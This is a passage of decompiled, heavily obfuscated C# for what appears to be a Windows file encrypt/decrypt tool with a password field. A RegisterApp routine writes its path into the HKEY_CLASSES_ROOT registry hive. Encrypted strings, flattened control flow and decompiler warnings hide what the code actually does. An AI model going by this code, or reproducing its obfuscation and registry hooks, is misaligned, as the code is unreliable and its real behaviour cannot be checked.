				componentResourceManager = new ComponentResourceManager(Type.GetTypeFromHandle(_0089_008E_008C_008D_0088_0090_008F_0095_008E_0088_0090_0089_0095_0093_0089_008E_008C_008B_0090_0093_008E_0091_0087_0095_0088_0095_0091_0086_008B_008B_008A_0086_0090_0094_0091_0095.e53w34m968awCm9P85taUZe(33554442)));
				num2 = 15;
				if (!_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
				{
					goto case 107;
				}
				goto IL_114a;
			case 107:
				((Control)btnAddFile).add_Click((EventHandler)btnAddFile_Click);
				num = 137;
				break;
			case 134:
				((Control)gbOptions).set_Size(new Size(404, 69));
				num3 = 103;
				goto IL_1146;
			case 97:
				btnAddFile = new Button();
				num3 = 83;
				goto IL_1146;
			case 112:
				((Control)label1).set_Text(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2056));
				num = 47;
				break;
			case 114:
			case 148:
				((Control)btnDecrypt).set_Size(new Size(163, 41));
				num = 43;
				break;
			case 22:
				((Control)label1).set_Location(new Point(205, 43));
				num2 = 142;
				if (!_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
				{
					goto case 112;
				}
				goto IL_114a;
			case 93:
				((Control)label1).set_AutoSize(true);
				num3 = 22;
				goto IL_1146;
			case 144:
				((Control)chkDeleteOrg).set_TabIndex(0);
				((Control)chkDeleteOrg).set_Text(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2104));
				num = 37;
				break;
			case 8:
				((Control)lblInfo).add_Click((EventHandler)lblInfo_Click);
				num3 = 19;
				goto IL_1146;
			case 92:
				((Control)this).get_Controls().Add((Control)(object)btnDecrypt);
				num3 = 90;
				goto IL_1146;
			case 158:
				((Control)lblInfo).set_TabIndex(5);
				num2 = 25;
				goto IL_114a;
			case 129:
				((Control)gbPaths).get_Controls().Add((Control)(object)btnAddFile);
				num2 = 91;
				if (1 == 0)
				{
					goto case 88;
				}
				goto IL_114a;
			case 88:
				lstPaths.set_HorizontalScrollbar(true);
				num3 = 151;
				goto IL_1146;
			case 25:
				((Control)lblInfo).set_Text(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2144));
				num = 135;
				break;
			case 120:
				((Control)btnRemovePath).set_TabIndex(3);
				num = 46;
				break;
			case 141:
				((Control)gbOptions).set_Text(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2048));
				num = 93;
				break;
			case 87:
				((Control)btnRemovePath).set_Location(new Point(323, 95));
				((Control)btnRemovePath).set_Name(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2016));
				((Control)btnRemovePath).set_Size(new Size(75, 23));
				num = 120;
				break;
			case 32:
				((Control)btnEncrypt).set_Font(new Font(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2116), 8f, (FontStyle)1));
				num2 = 33;
				if (1 == 0)
				{
					goto case 115;
				}
				goto IL_114a;
			case 115:
				((Control)gbPaths).add_Enter((EventHandler)gbPaths_Enter);
				num2 = 87;
				goto IL_114a;
			case 102:
				((Control)chkSubFolders).set_Name(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2092));
				num2 = 31;
				if (false)
				{
					goto case 55;
				}
				goto IL_114a;
			case 55:
				((ButtonBase)btnDecrypt).set_UseVisualStyleBackColor(true);
				num2 = 155;
				goto IL_114a;
			case 166:
				((Control)chkDeleteOrg).set_Size(new Size(117, 17));
				num2 = 144;
				if (_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091())
				{
					goto case 14;
				}
				goto IL_114a;
			case 140:
				((Control)btnDecrypt).set_Location(new Point(253, 287));
				num = 69;
				break;
			case 62:
				((Control)lstPaths).add_DragEnter(new DragEventHandler(lstPaths_DragEnter));
				num2 = 104;
				if (1 == 0)
				{
					goto case 54;
				}
				goto IL_114a;
			case 54:
				lstExts = new ComboBox();
				num2 = 98;
				goto IL_114a;
			case 18:
				((TextBoxBase)txtLog).set_Multiline(true);
				num3 = 116;
				goto IL_1146;
			case 106:
				((Control)gbOptions).set_Name(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2044));
				num2 = 134;
				goto IL_114a;
			case 65:
				((Form)this).set_StartPosition((FormStartPosition)1);
				num2 = 76;
				goto IL_114a;
			case 35:
				gbPaths.set_TabStop(false);
				num = 20;
				break;
			case 125:
				((ButtonBase)btnAddFile).set_UseVisualStyleBackColor(true);
				num2 = 107;
				if (1 == 0)
				{
					goto case 121;
				}
				goto IL_114a;
			case 121:
				((Control)gbLog).set_Size(new Size(401, 115));
				num3 = 132;
				goto IL_1146;
			case 139:
				((Control)gbPassword).PerformLayout();
				num = 81;
				break;
			case 29:
				((Control)btnEncrypt).set_TabIndex(3);
				num3 = 145;
				goto IL_1146;
			case 30:
				((Control)chkSubFolders).set_Location(new Point(6, 42));
				num2 = 102;
				goto IL_114a;
			case 138:
				((Control)gbPassword).set_Location(new Point(12, 223));
				num2 = 89;
				goto IL_114a;
			case 0:
				txtPassword.set_TextAlign((HorizontalAlignment)2);
				num2 = 32;
				if (false)
				{
					goto case 79;
				}
				goto IL_114a;
			case 79:
				((Control)btnAddFile).set_Text(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2036));
				num = 125;
				break;
			case 167:
				((Control)gbPaths).get_Controls().Add((Control)(object)btnRemovePath);
				num2 = 136;
				if (!_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
				{
					goto case 18;
				}
				goto IL_114a;
			case 152:
				gbOptions = new GroupBox();
				num3 = 34;
				goto IL_1146;
			case 64:
				((Control)chkSubFolders).set_AutoSize(true);
				num = 30;
				break;
			case 28:
				((Control)txtLog).set_BackColor(Color.White);
				num = 6;
				break;
			case 60:
				((Control)txtPassword).set_Size(new Size(398, 27));
				num3 = 99;
				goto IL_1146;
			case 27:
				((Control)gbOptions).PerformLayout();
				num3 = 163;
				goto IL_1146;
			case 108:
				btnAddFolder = new Button();
				num2 = 97;
				if (_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091())
				{
					goto case 137;
				}
				goto IL_114a;
			case 137:
				((Control)lstPaths).set_AllowDrop(true);
				num3 = 80;
				goto IL_1146;
			case 12:
				((Control)btnEncrypt).set_Name(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2124));
				num2 = 162;
				goto IL_114a;
			case 61:
				((Control)label1).set_Size(new Size(64, 13));
				num2 = 5;
				if (false)
				{
					goto case 90;
				}
				goto IL_114a;
			case 90:
				((Control)this).get_Controls().Add((Control)(object)btnEncrypt);
				num3 = 124;
				goto IL_1146;
			case 66:
				gbLog.set_TabStop(false);
				num2 = 111;
				if (1 == 0)
				{
					goto case 72;
				}
				goto IL_114a;
			case 72:
				((Control)btnAddFolder).set_Name(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2024));
				num3 = 128;
				goto IL_1146;
			case 47:
				((ListControl)lstExts).set_FormattingEnabled(true);
				num3 = 44;
				goto IL_1146;
			case 2:
				if (_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.EmWT1u1C4(100))
				{
					num2 = 74;
					if (_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091())
					{
						goto case 44;
					}
					goto IL_114a;
				}
				return;
			case 76:
				((Control)this).set_Text(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2164));
				((Form)this).add_Load((EventHandler)MainWindow_Load);
				num3 = 3;
				goto IL_1146;
			case 164:
				((ButtonBase)chkSubFolders).set_UseVisualStyleBackColor(true);
				goto case 16;
			default:
				num2 = 16;
				goto IL_114a;
			case 69:
				((Control)btnDecrypt).set_Name(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2132));
				goto case 114;
			case 117:
				lblInfo = new Label();
				num3 = 157;
				goto IL_1146;
			case 160:
				gbPassword.set_TabStop(false);
				num = 38;
				break;
			case 41:
				((Control)btnAddFolder).set_Location(new Point(88, 95));
				num2 = 72;
				goto IL_114a;
			case 96:
				((Control)btnAddFile).set_Size(new Size(75, 23));
				num = 53;
				break;
			case 75:
				((Control)chkDeleteOrg).set_Location(new Point(7, 19));
				num3 = 56;
				goto IL_1146;
			case 9:
				((Control)lblInfo).set_Location(new Point(0, 452));
				num = 52;
				break;
			case 24:
				((Control)this).get_Controls().Add((Control)(object)gbPaths);
				num = 17;
				break;
			case 154:
				((Control)gbOptions).ResumeLayout(false);
				num2 = 27;
				if (true)
				{
					goto IL_114a;
				}
				goto case 36;
			case 36:
			case 133:
				((Control)btnRemovePath).add_Click((EventHandler)btnRemovePath_Click);
				num2 = 41;
				if (true)
				{
					goto IL_114a;
				}
				goto case 77;
			case 77:
				((Control)gbOptions).set_Location(new Point(12, 148));
				num2 = 106;
				goto IL_114a;
			case 126:
				((Control)gbPassword).get_Controls().Add((Control)(object)txtPassword);
				num = 138;
				break;
			case 127:
				((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
				num3 = 73;
				goto IL_1146;
			case 67:
				((Control)lblInfo).set_Size(new Size(428, 20));
				num2 = 158;
				goto IL_114a;
			case 99:
				((Control)txtPassword).set_TabIndex(0);
				num2 = 0;
				goto IL_114a;
			case 1:
				((Control)this).get_Controls().Add((Control)(object)gbLog);
				num = 146;
				break;
			case 146:
				((Control)this).get_Controls().Add((Control)(object)lblInfo);
				num2 = 92;
				goto IL_114a;
			case 145:
				((Control)btnEncrypt).set_Text(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2128));
				num2 = 95;
				if (!_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
				{
					goto case 4;
				}
				goto IL_114a;
			case 20:
				((Control)gbPaths).set_Text(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2012));
				num3 = 115;
				goto IL_1146;
			case 11:
				btnRemovePath = new Button();
				num2 = 108;
				if (_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
				{
					goto IL_114a;
				}
				goto case 53;
			case 53:
				((Control)btnAddFile).set_TabIndex(1);
				num = 79;
				break;
			case 71:
				btnDecrypt = new Button();
				num2 = 117;
				if (true)
				{
					goto IL_114a;
				}
				goto case 118;
			case 118:
				((Control)btnAddFile).set_Location(new Point(7, 95));
				num3 = 68;
				goto IL_1146;
			case 111:
				((Control)gbLog).set_Text(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2152));
				num2 = 28;
				if (0 == 0)
				{
					goto IL_114a;
				}
				goto case 70;
			case 70:
				((Control)lstExts).set_Name(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2088));
				((Control)lstExts).set_Size(new Size(121, 21));
				num3 = 130;
				goto IL_1146;
			case 5:
				((Control)label1).set_TabIndex(3);
				num2 = 112;
				goto IL_114a;
			case 78:
				((Control)lstPaths).set_Name(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2040));
				num2 = 58;
				goto IL_114a;
			case 46:
				((Control)btnRemovePath).set_Text(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2020));
				((ButtonBase)btnRemovePath).set_UseVisualStyleBackColor(true);
				_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091();
				if (!_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
				{
					num2 = 148;
					goto IL_114a;
				}
				num = 133;
				break;
			case 142:
				((Control)label1).set_Name(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2052));
				num3 = 61;
				goto IL_1146;
			case 58:
				((Control)lstPaths).set_Size(new Size(392, 69));
				((Control)lstPaths).set_TabIndex(0);
				num2 = 40;
				if (!_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091())
				{
					goto IL_114a;
				}
				goto case 143;
			case 143:
				((Control)btnEncrypt).add_Click((EventHandler)btnEncrypt_Click);
				num3 = 153;
				goto IL_1146;
			case 157:
				gbLog = new GroupBox();
				txtLog = new TextBox();
				num = 156;
				break;
			case 48:
				((Control)gbLog).set_Location(new Point(12, 334));
				num3 = 109;
				goto IL_1146;
			case 7:
				((Control)gbOptions).get_Controls().Add((Control)(object)chkSubFolders);
				num = 14;
				break;
			case 15:
				gbPaths = new GroupBox();
				num2 = 11;
				if (true)
				{
					goto IL_114a;
				}
				goto case 52;
			case 52:
				((Control)lblInfo).set_Name(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2140));
				num2 = 67;
				goto IL_114a;
			case 168:
				return;
				IL_114a:
				num = num2;
				break;
				IL_1146:
				num2 = num3;
				goto IL_114a;
			}
		}
	}

	internal static bool _0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092()
	{
		//Discarded unreachable code: IL_0005
		//IL_0006: Incompatible stack heights: 0 vs 1
		return true;
	}

	internal static bool _008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091()
	{
		//Discarded unreachable code: IL_0005
		//IL_0006: Incompatible stack heights: 0 vs 1
		return false;
	}
}
internal static class _0093_0094_0087_0091_0093_0093_008A_0091_0088_008E_008D_008D_008A_0086_0094_0093_008D_008D_0088_0091_008D_0091_0092_008D_0093_0095_0086_0094_0092_0090_0092_008A_0091_0088_0086_0093
{
	[MethodImpl(MethodImplOptions.NoInlining)]
	[STAThread]
	private static void Main(string[] _0020)
	{
		//Discarded unreachable code: IL_0005, IL_008f
		//IL_0006: Incompatible stack heights: 0 vs 1
		//IL_0070: Incompatible stack heights: 0 vs 1
		int num = 2;
		bool flag2 = default(bool);
		bool flag3 = default(bool);
		bool flag = default(bool);
		while (true)
		{
			int num2;
			int num3;
			switch (num)
			{
			case 12:
				if (flag2)
				{
					goto case 11;
				}
				Application.Run((Form)(object)new _008C_0091_0086_0086_0086_0091_008C_0087_0094_008A_0094_008F_0094_0093_0094_0086_0090_008D_008F_0094_008A_008C_0093_008D_008E_0093_0086_0088_008E_0088_0092_008B_0087_0091_0094_008E());
				num = 5;
				break;
			case 1:
				flag3 = _0020[0] == _008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2168);
				num2 = 9;
				goto IL_0098;
			case 8:
				return;
			case 13:
				Application.EnableVisualStyles();
				_ = 0;
				if (!_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
				{
					num = 14;
					break;
				}
				num2 = 0;
				goto IL_0098;
			case 9:
				if (flag3)
				{
					goto case 4;
				}
				flag2 = _0020[0] == _008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2172);
				num3 = 12;
				goto IL_0094;
			default:
				num3 = 4;
				goto IL_0094;
			case 15:
				if (flag)
				{
					num = 1;
					break;
				}
				Application.Run((Form)(object)new _008C_0091_0086_0086_0086_0091_008C_0087_0094_008A_0094_008F_0094_0093_0094_0086_0090_008D_008F_0094_008A_008C_0093_008D_008E_0093_0086_0088_008E_0088_0092_008B_0087_0091_0094_008E());
				num = 16;
				break;
			case 2:
				if (_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.EmWT1u1C4(104))
				{
					num2 = 6;
					if (!_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091())
					{
						goto IL_0098;
					}
					goto case 0;
				}
				return;
			case 7:
				return;
			case 11:
			case 14:
				UnRegisterApp();
				num = 8;
				break;
			case 4:
				RegisterApp();
				num = 7;
				break;
			case 10:
				flag = _0020.Length != 0;
				num2 = 15;
				if (0 == 0)
				{
					goto IL_0098;
				}
				goto case 6;
			case 6:
				Application.add_ThreadException((ThreadExceptionEventHandler)Application_ThreadException);
				num3 = 13;
				goto IL_0094;
			case 5:
				return;
			case 0:
			case 3:
				Application.SetCompatibleTextRenderingDefault(false);
				num = 10;
				break;
			case 16:
				return;
				IL_0098:
				num = num2;
				break;
				IL_0094:
				num2 = num3;
				goto IL_0098;
			}
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private static void Application_ThreadException(object _0020, ThreadExceptionEventArgs _0020)
	{
		//Discarded unreachable code: IL_0005, IL_006a
		//IL_0006: Incompatible stack heights: 0 vs 1
		try
		{
			DateTime now = DateTime.Now;
			_ = 0;
			int num;
			if (_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
			{
				num = 4;
				if (false)
				{
					goto IL_002a;
				}
			}
			else
			{
				num = 2;
			}
			goto IL_0073;
			IL_006f:
			int num2;
			num = num2;
			goto IL_0073;
			IL_002a:
			string text = default(string);
			_008A_0094_0086_0089_0094_0094_008B_0090_0091_008C_0095_008A_008C_008C_0095_0086_0089_0092_008D_008F_008B_008C_008F_0087_0086_0093_0089_0087_0094_008C_0090_0095_008C_0088_008D_0086.WriteLog(text, _0020.Exception.ToString());
			num2 = 5;
			goto IL_006f;
			IL_0073:
			string text2 = default(string);
			switch (num)
			{
			case 3:
				break;
			case 1:
			case 2:
				text = Path.Combine(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(212), text2 + _008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(224));
				break;
			default:
				goto IL_0094;
			case 0:
			case 4:
				text2 = now.ToString(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(216));
				goto case 1;
			case 5:
				return;
			}
			goto IL_002a;
			IL_0094:
			num2 = 3;
			goto IL_006f;
		}
		catch
		{
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public static void RegisterApp()
	{
		//Discarded unreachable code: IL_0005, IL_00ad
		//IL_0006: Incompatible stack heights: 0 vs 1
		//IL_0128: Incompatible stack heights: 0 vs 1
		//IL_015e: Unknown result type (might be due to invalid IL or missing references)
		//IL_029d: Unknown result type (might be due to invalid IL or missing references)
		if (!_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.EmWT1u1C4(108))
		{
			return;
		}
		try
		{
			RegistryKey registryKey = Registry.ClassesRoot.OpenSubKey(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2176))!.OpenSubKey(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2180))!.OpenSubKey(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2184), writable: true)!.CreateSubKey(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2164));
			int num = 1;
			if (!_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091())
			{
				goto IL_00b6;
			}
			goto IL_0146;
			IL_0146:
			MessageBox.Show(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2208), _008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2164), (MessageBoxButtons)0, (MessageBoxIcon)64);
			num = 12;
			goto IL_00b6;
			IL_00b6:
			while (true)
			{
				int num2;
				switch (num)
				{
				case 3:
					registryKey = Registry.ClassesRoot.OpenSubKey(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2176))!.OpenSubKey(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2184), writable: true)!.CreateSubKey(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2164));
					goto default;
				case 11:
					registryKey.SetValue(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2192), Application.get_ExecutablePath(), RegistryValueKind.String);
					_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092();
					if (_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091())
					{
						num = 10;
						continue;
					}
					num = 7;
					if (_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
					{
						continue;
					}
					goto case 3;
				case 8:
					break;
				case 1:
					registryKey.SetValue("", _008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2188), RegistryValueKind.String);
					num2 = 11;
					goto IL_00b2;
				case 9:
					registryKey = registryKey.CreateSubKey(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2196));
					num = 4;
					continue;
				case 4:
